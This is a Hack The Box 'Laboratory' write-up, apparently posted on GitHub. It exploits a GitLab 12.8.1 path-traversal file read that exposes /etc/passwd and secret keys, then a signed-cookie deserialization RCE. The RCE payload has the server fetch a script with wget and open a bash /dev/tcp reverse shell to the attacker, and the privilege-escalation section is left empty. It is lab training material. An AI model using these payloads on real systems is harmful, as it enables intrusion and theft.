# Introduction

[![Laboratory](https://1.bp.blogspot.com/-QMNR6LckGZA/X7p-gYNZYxI/AAAAAAAAGnU/P6yFx9-cXdcml-USeeaTRU4FsSCti-RTgCLcBGAsYHQ/s0/infocard.png)](https://www.hackthebox.eu/home/machines/profile/298)

| Point | Description |
| :------:| :------: |
| Name | Laboratory   |
| OS   | Linux  |
| Difficulty Ratings| Medium   |
| Release | 14 Nov 2020   |
| IP | 10.10.10.216   |
| Owned | 16.01.2021 |
# Short retelling
* Using Nmap and find new subdomain
* Register on this site and find version of service
* Find CVE for this kind of web-server
* Checking CVE
* Run Docker same version
* Configure it and create explotation of RCE
* Upload reverse shell comand to web-server and run it
* Connected to machine
* Trying to escape from docker, use git railway-console
* Change password of gitlab's administration
* Sign in with admin login and our new password
* Find id_rsa in folder /.ssh
* SSH coonect to the host and find user.txt
* Find bin programm
* Check it with radare2
* Find way to use the path hijacking
* Get root.txt

# Enumeration

## Nmap
Start to recon host laboratory 10.10.10.216

```
┌──(root💀kali)-[/home/kali]
└─# nmap -sV -sC -p- 10.10.10.216 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-18 08:42 EST
Nmap scan report for laboratory.htb (10.10.10.216)
Host is up (0.16s latency).
Not shown: 65532 filtered ports
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 25:ba:64:8f:79:9d:5d:95:97:2c:1b:b2:5e:9b:55:0d (RSA)
|   256 28:00:89:05:55:f9:a2:ea:3c:7d:70:ea:4d:ea:60:0f (ECDSA)
|_  256 77:20:ff:e9:46:c0:68:92:1a:0b:21:29:d1:53:aa:87 (ED25519)
80/tcp  open  http     Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to https://laboratory.htb/
443/tcp open  ssl/http Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: The Laboratory
| ssl-cert: Subject: commonName=laboratory.htb
| Subject Alternative Name: DNS:git.laboratory.htb
| Not valid before: 2020-07-05T10:39:28
|_Not valid after:  2024-03-03T10:39:28
| tls-alpn: 
|_  http/1.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Lets add laboratory.htb to /etc/hosts and check site.

![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/1.jpg)

## Dirb

We don't see anything scripts or plugins, also there isn't authorization form. Lets check open directory of laboratory.htb.

```
┌──(root💀kali)-[/home/kali]
└─# dirb https://laboratory.htb/                                                                                                                                     130 ⨯

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Mon Jan 18 08:59:33 2021
URL_BASE: https://laboratory.htb/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: https://laboratory.htb/ ----
==> DIRECTORY: https://laboratory.htb/assets/                                                                                                                             
==> DIRECTORY: https://laboratory.htb/images/                                                                                                                             
+ https://laboratory.htb/index.html (CODE:200|SIZE:7254)                                                                                                                  
+ https://laboratory.htb/server-status (CODE:403|SIZE:280)                                                                                                                
                                                                                                                                                                          
---- Entering directory: https://laboratory.htb/assets/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                          
---- Entering directory: https://laboratory.htb/images/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
```
We find some files in these dirbs, checking everithing and nothithng interesting.

## ffuf

Next step will try to bruteforce subdomain.

```
┌──(root💀kali)-[/home/kali/HTB]
└─# ffuf -w /home/kali/HTB/Laboratory/subdomains-top1million-110000.txt -u https://FUZZ.laboratory.htb/ -c

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.2.0-git
________________________________________________

 :: Method           : GET
 :: URL              : https://FUZZ.laboratory.htb/
 :: Wordlist         : FUZZ: /home/kali/HTB/Laboratory/subdomains-top1million-110000.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
________________________________________________

git                     [Status: 302, Size: 105, Words: 5, Lines: 1]
[WARN] Caught keyboard interrupt (Ctrl-C)
```
My network adapter turned off by itself during brute-force. But we could find subdomain __git__.
Its enough, because in results of nmap scan we can see info about subdomain too: *Subject Alternative Name: DNS:git.laboratory.htb*.
Add git.laboratory.htb to /etc/hosts

And we can see that **gitlab** is hosted on *git.laboratory.htb*.

# Explotation#1

I guess we need to find CVE for this version of gitlab. But in *https://git.laboratory.htb/help* we dont see any info about verion of gitlab.
Anyway, there is "register" and "sign in" form, lets try registered my self.
![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/2.jpg)

And logged in.
Now version of gitlab is available tu us in *https://git.laboratory.htb/help*
![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/3.jpg)

Lets find some CVE for this version. And we got it.

* https://hackerone.com/reports/827052
* https://xakep.ru/2020/05/26/gitlab-exploit/

I will follow the "xakep" magazine article. This CVE is about LFI & RCE.

First we will check LFI:

* We need to create two projects. For example TEST1 and TEST2.
* After we need to create *issue* in one of project.
* Add screenshot in description of *issue*
> ![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/4.jpg)
* After saving, edit description for issue like `![Screenshot_2021-01-11_10_04_37](/uploads/5b87a86991332598febe11dadd2855d7/../../../../../../../../../../../../../../../../etc/passwd)`. Submit issue.
* And move issue to another project (TEST1).
* We can read /etc/passwd
> ![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/5.jpg)
```
oot:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
_apt:x:104:65534::/nonexistent:/bin/false
sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
git:x:998:998::/var/opt/gitlab:/bin/sh
gitlab-www:x:999:999::/var/opt/gitlab/nginx:/bin/false
gitlab-redis:x:997:997::/var/opt/gitlab/redis:/bin/false
gitlab-psql:x:996:996::/var/opt/gitlab/postgresql:/bin/sh
mattermost:x:994:994::/var/opt/gitlab/mattermost:/bin/sh
registry:x:993:993::/var/opt/gitlab/registry:/bin/sh
gitlab-prometheus:x:992:992::/var/opt/gitlab/prometheus:/bin/sh
gitlab-consul:x:991:991::/var/opt/gitlab/consul:/bin/sh
```

# Explotation#2

Now we can read files on the srever and need to perform RCE.

For using RCE we need to read `secret_key_base` `/opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml`

`![Screenshot_2021-01-11_10_04_37](/uploads/9d6e6e4bfd8dfcec43059a232b87b6f9/../../../../../../../../../../opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml)`

and same moving issue.

```
# This file is managed by gitlab-ctl. Manual changes will be
# erased! To change the contents below, edit /etc/gitlab/gitlab.rb
# and run `sudo gitlab-ctl reconfigure`.

---
production:
  db_key_base: 627773a77f567a5853a5c6652018f3f6e41d04aa53ed1e0df33c66b04ef0c38b88f402e0e73ba7676e93f1e54e425f74d59528fb35b170a1b9d5ce620bc11838
  secret_key_base: 3231f54b33e0c1ce998113c083528460153b19542a70173b4458a21e845ffa33cc45ca7486fc8ebb6b2727cc02feea4c3adbe2cc7b65003510e4031e164137b3
  otp_key_base: db3432d6fa4c43e68bf7024f3c92fea4eeea1f6be1e6ebd6bb6e40e930f0933068810311dc9f0ec78196faa69e0aac01171d62f4e225d61e0b84263903fd06af
```

Saving `secret_key_base`
```3231f54b33e0c1ce998113c083528460153b19542a70173b4458a21e845ffa33cc45ca7486fc8ebb6b2727cc02feea4c3adbe2cc7b65003510e4031e164137b3```

Now for create exploit RCE we need to up docker with gitlab version 12.8.1 in another virtual machine.

```docker run --rm -d --hostname gitlab.vh -p 443:443 -p 80:80 -p 2222:22 --name gitlab gitlab/gitlab-ce:12.8.1-ce.0```

```docker exec -ti gitlab /bin/bash```

Edit `secret_key` in /opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml

```
gitlab-ctl reconfigure
gitlab-ctl restart
gitlab-rails console
```

And create payload

```
request = ActionDispatch::Request.new(Rails.application.env_config)

request.env["action_dispatch.cookies_serializer"] = :marshal

cookies = request.cookie_jar

erb = ERB.new("<%= `wget http://10.10.14.162:8888/pasha.sh && chmod +x pasha.sh && /bin/bash pasha.sh` %>")

depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result, "@result", ActiveSupport::Deprecation.new)

cookies.signed[:cookie] = depr
```

And we got a payload:
```
AhvOkBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo6RGVwcmVjYXRlZEluc3RhbmNlVmFyaWFibGVQcm94eQk6DkBpbnN0YW5jZW86CEVSQgs6EEBzYWZlX2xldmVsMDoJQHNyY0kiAY4jY29kaW5nOlVURi04Cl9lcmJvdXQgPSArJyc7IF9lcmJvdXQuPDwoKCBgd2dldCBodHRwOi8vMTAuMTAuMTQuMTYyOjg4ODgvcGFzaGEuc2ggJiYgY2htb2QgK3ggcGFzaGEuc2ggJiYgL2Jpbi9iYXNoIHBhc2hhLnNoYCApLnRvX3MpOyBfZXJib3V0BjoGRUY6DkBlbmNvZGluZ0l1Og1FbmNvZGluZwpVVEYtOAY7CkY6E0Bmcm96ZW5fc3RyaW5nMDoOQGZpbGVuYW1lMDoMQGxpbmVub2kAOgxAbWV0aG9kOgtyZXN1bHQ6CUB2YXJJIgxAcmVzdWx0BjsKVDoQQGRlcHJlY2F0b3JJdTofQWN0aXZlU3VwcG9ydDo6RGVwcmVjYXRpb24ABjsKVA==--5baee5481c899005c1ea5783cf6bbb6c9f644fec
```

Now we create reverse shell *pasha.sh*
```
bash -i >& /dev/tcp/10.10.14.162/1234 0>&1
```

After start `python3 -m http.server 8888`
And use `nc -nlvp 1234`

We need install extensions *Cookie-Editor* in Mozilla fire fox. And login with "Remeber me".
We wiil send a cookie payload to *remeber_user_token*
![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/6.jpg)

Starting payload...

```
┌──(root💀kali)-[/home/kali/HTB/Labartory]
└─# curl -k 'https://git.laboratory.htb/' -b "remember_user_token=BAhvOkBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo6RGVwcmVjYXRlZEluc3RhbmNlVmFyaWFibGVQcm94eQk6DkBpbnN0YW5jZW86CEVSQgs6EEBzYWZlX2xldmVsMDoJQHNyY0kiAY4jY29kaW5nOlVURi04Cl9lcmJvdXQgPSArJyc7IF9lcmJvdXQuPDwoKCBgd2dldCBodHRwOi8vMTAuMTAuMTQuMTYyOjg4ODgvcGFzaGEuc2ggJiYgY2htb2QgK3ggcGFzaGEuc2ggJiYgL2Jpbi9iYXNoIHBhc2hhLnNoYCApLnRvX3MpOyBfZXJib3V0BjoGRUY6DkBlbmNvZGluZ0l1Og1FbmNvZGluZwpVVEYtOAY7CkY6E0Bmcm96ZW5fc3RyaW5nMDoOQGZpbGVuYW1lMDoMQGxpbmVub2kAOgxAbWV0aG9kOgtyZXN1bHQ6CUB2YXJJIgxAcmVzdWx0BjsKVDoQQGRlcHJlY2F0b3JJdTofQWN0aXZlU3VwcG9ydDo6RGVwcmVjYXRpb24ABjsKVA==--5baee5481c899005c1ea5783cf6bbb6c9f644fec"
```

And we get a shell of system user **git**
```
┌──(root💀kali)-[/home/kali/HTB/Labartory]
└─# nc -nlvp 1234                                                                                                                                                      1 ⨯
listening on [any] 1234 ...
connect to [10.10.14.162] from (UNKNOWN) [10.10.10.216] 46810
bash: cannot set terminal process group (403): Inappropriate ioctl for device
bash: no job control in this shell
git@git:~/gitlab-rails/working$ 
```
# Privilege Escalation

# Result and Resources
